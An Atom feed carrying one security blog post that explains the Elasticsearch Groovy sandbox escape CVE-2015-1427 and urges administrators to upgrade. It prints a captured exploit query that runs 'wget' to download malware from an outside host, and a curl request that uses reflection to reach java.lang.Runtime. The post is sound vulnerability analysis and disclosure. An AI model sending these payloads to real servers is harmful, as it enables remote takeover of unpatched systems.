<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnerability | jordan-wright]]></title>
  <link href="http://jordan-wright.github.io/blog/categories/vulnerability/atom.xml" rel="self"/>
  <link href="http://jordan-wright.github.io/"/>
  <updated>2015-05-18T19:36:08-05:00</updated>
  <id>http://jordan-wright.github.io/</id>
  <author>
    <name><![CDATA[Jordan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Remote Code Execution in Elasticsearch - CVE-2015-1427]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/"/>
    <updated>2015-03-08T13:40:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427</id>
    <content type="html"><![CDATA[<p><img src="/images/headers/elk_rce.png"/></p>

<blockquote><p>TL;DR If you have an elasticsearch instance that is publicly available, upgrade to 1.4.3 or later <strong>now</strong>.</p></blockquote>

<p>Elasticsearch (the &ldquo;E&rdquo; in ELK) is a full-text search engine that makes data aggregation and querying easy. It has an extensive JSON API that allows everything from searching to system management. This post will show how a new vulnerability, CVE-2015-1427, allows attackers to leverage features of this API to gain unauthenticated remote code execution (RCE).</p>

<blockquote><p>Much of the analysis discovering this vulnerability was originally found on a blog post <a href="http://drops.wooyun.org/papers/5107">here</a> (<a href="https://translate.google.com/translate?hl=en&amp;sl=zh-CN&amp;tl=en&amp;u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F5107">translated</a>). This post aims to translate and provide more detail on the vulnerability.</p></blockquote>

<!--more-->


<h3>This Isn&rsquo;t Elasticsearch&rsquo;s First Rodeo</h3>

<p>One feature of the <code>_search</code> API endpoint is to allow users to <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html">submit Groovy code</a> in the search query itself. The server will then execute the code in a sandboxed environment, returning the result to the user. This way, the elasticsearch code can be used to execute&hellip; more code<sup>1</sup></p>

<p>Allowing anybody to submit server-side code to get executed is a <em>dangerous</em> game to play. In fact, this isn&rsquo;t the first time Elasticsearch has been bitten by this feature. Elasticsearch pre-1.2 didn&rsquo;t have a sandbox <em>at all</em>, and allowed anyone to submit code to be executed. Since there are zero authentication controls built into elasticsearch, if the service is exposed to the Internet, anyone can own a server with a query like this:</p>

<p>```
{&ldquo;query&rdquo;:</p>

<pre><code>{"filtered": {
    "query": {"match_all": {}}}},
    "script_fields": {"exp": {
        "script": "import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -O /tmp/malware http://x.x.x.x/malware \").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"
}}}
</code></pre>

<p>```</p>

<blockquote><p>Fun fact! This is an actual exploit attempt I&rsquo;ve seen on my server.</p></blockquote>

<p>This isn&rsquo;t anything new. In fact, there&rsquo;s a <a href="http://www.rapid7.com/db/modules/exploit/multi/elasticsearch/script_mvel_rce">Metasploit module</a> that makes this easy.</p>

<p>Starting with version 1.3, Elasticsearch <a href="http://www.elasticsearch.org/blog/scripting/">allowed sending Groovy scripts</a> in the query again. However, they added a sandbox to control what classes and functions can be executed.</p>

<p>Let&rsquo;s take a quick look at how the sandbox works to get a feel for how it can be exploited.</p>

<h3>How the Sandbox Works</h3>

<p>The functions and classes that are allowed by the sandbox are found in <a href="https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java"><code>GroovySandboxExpressionChecker.java</code></a>. Looking at the code, we notice the function <code>isAuthorized</code>. This function takes in an expression and checks to see if it is allowed to be executed.</p>

<p>Without going through <strong>everything</strong> the sandbox does, here&rsquo;s the important part of the function:</p>

<p>```java
if (expression instanceof MethodCallExpression) {</p>

<pre><code>MethodCallExpression mce = (MethodCallExpression) expression;
String methodName = mce.getMethodAsString();
if (methodBlacklist.contains(methodName)) {
    return false;
} else if (methodName == null &amp;&amp; mce.getMethod() instanceof GStringExpression) {
    // We do not allow GStrings for method invocation, they are a security risk
    return false;
}
//snip
</code></pre>

<p>}
```</p>

<p>This is the condition that checks to see if our method call is allowed to be executed. There are two checks we need to bypass in order to make this happen:</p>

<p><code>java
if (methodBlacklist.contains(methodName))
</code></p>

<p>The <code>methodBlacklist</code> contains the following method calls that we can&rsquo;t use:</p>

<p>```java
public static String[] defaultMethodBlacklist = new String[]{</p>

<pre><code>"getClass",
"wait",
"notify",
"notifyAll",
"finalize"
</code></pre>

<p>};
```</p>

<p>Ok, so we can&rsquo;t use any of those. Next, we need to make sure that our method name isn&rsquo;t null, and we don&rsquo;t use a <a href="http://groovy.codehaus.org/api/org/codehaus/groovy/ast/expr/GStringExpression.html"><code>GStringExpression</code></a>. No problem.</p>

<p>There&rsquo;s one more hurdle that we have to overcome. This sandbox also restricts the packages that can have methods called on them (from <a href="https://github.com/groovy/groovy-core/blob/0b2182bff2250150e69ccb988f367e709b4560de/src/main/org/codehaus/groovy/control/customizers/SecureASTCustomizer.java#L854"><code>SecureASTCustomizer.java</code></a>):</p>

<p>```java
if (receiversWhiteList != null &amp;&amp; !receiversWhiteList.contains(typeName)) {</p>

<pre><code>throw new SecurityException("Method calls not allowed on [" + typeName + "]");
</code></pre>

<p>} else if (receiversBlackList != null &amp;&amp; receiversBlackList.contains(typeName)) {</p>

<pre><code>throw new SecurityException("Method calls not allowed on [" + typeName + "]");
</code></pre>

<p>}
```</p>

<p>The whitelist for elasticsearch is found in the variable <code>defaultReceiverWhitelist</code>:</p>

<p>```java
private final static String[] defaultReceiverWhitelist = new String [] {</p>

<pre><code>groovy.util.GroovyCollections.class.getName(),
java.lang.Math.class.getName(),
java.lang.Integer.class.getName(), "[I", "[[I", "[[[I",
//snip
</code></pre>

<p>};
```</p>

<p>On the surface, this eliminates our ability to call any methods on interesting packages, such as <code>java.lang.Runtime</code>, which could be used to execute system commands. However, there&rsquo;s a way we can bypass both the package whitelist and the method blacklist to execute our code. This is done through a tricky Java feature called <a href="http://docs.oracle.com/javase/tutorial/reflect/"><code>reflection</code></a>.</p>

<h3>Bypassing the Sandbox with Reflection</h3>

<p>Vulnerabilities can often be reverse-engineered by inspecting the patches since the previous release. The commit that we will look at is <a href="https://github.com/elasticsearch/elasticsearch/commit/68c4a6201e6c889b272c1b64550237fe6d172b47">here</a>. The changes in this commit give us some hints about how we can exploit the vulnerability:</p>

<p><img src="/images/blog/elk/rce.png"/></p>

<p>This makes it pretty clear that we can probably do something with the <code>.class</code> and <code>.forName()</code> method calls. These methods, chained together, allow us to take one package class (such as one found in the whitelist) and use it to load a reference to a completely separate class (such as <code>java.lang.Runtime</code>) via reflection.</p>

<p>So what does this look like?</p>

<p>Let&rsquo;s see if we can load the <code>java.lang.Runtime</code> package by using reflection off of the <code>java.lang.Math</code> package, which is in the whitelist of packages we can use:</p>

<p>```text
$ curl <a href="http://localhost:9200/_search?pretty">http://localhost:9200/_search?pretty</a> -XPOST -d &lsquo;{&ldquo;script_fields&rdquo;: {&ldquo;myscript&rdquo;: {&ldquo;script&rdquo;: &ldquo;java.lang.Math.class.forName(\"java.lang.Runtime\&rdquo;)&ldquo;}}}&rsquo;</p>

<p>{
  <snip>
  &ldquo;hits&rdquo; : {</p>

<pre><code>"total" : 8,
"max_score" : 1.0,
"hits" : [ {
  &lt;snip&gt;
  "fields" : {
    "myscript" : [ "class java.lang.Runtime" ]
  }
}
</code></pre>

<p>}}
```</p>

<p><em>Success!</em> We can see the result of our query returned an instance of the <code>java.lang.Runtime</code> class. We can use this instance to execute system commands on the server.</p>

<p>I won&rsquo;t provide a full proof-of-concept, but all the pieces are here. Using a mix of the first exploit shown above along with the way I&rsquo;ve shown to get a reference to the <code>java.lang.Runtime</code> package, it is pretty straightforward to run whatever commands you want.</p>

<h3>Conclusion</h3>

<p>This vulnerability was not heavily advertised, but it is absolutely critical. In fact, I had one of my own elasticsearch instances compromised this way, showing this vulnerability is heavily being exploited in the wild.</p>

<p>Elasticsearch recommends to only allow the software to be accessed locally, but there are a <em>ton</em> of publicly available ES instances. This is likely because the default configuration listens on <code>0.0.0.0:9200</code>.</p>

<p>If you use elasticsearch, and haven&rsquo;t upgraded to 1.4.3 (or the latest 1.4.4), I recommend upgrading <strong>immediately</strong>.</p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>

<p><sup>1</sup> There&rsquo;s an Xzibit joke to be made here.</p>
]]></content>
  </entry>
  
</feed>
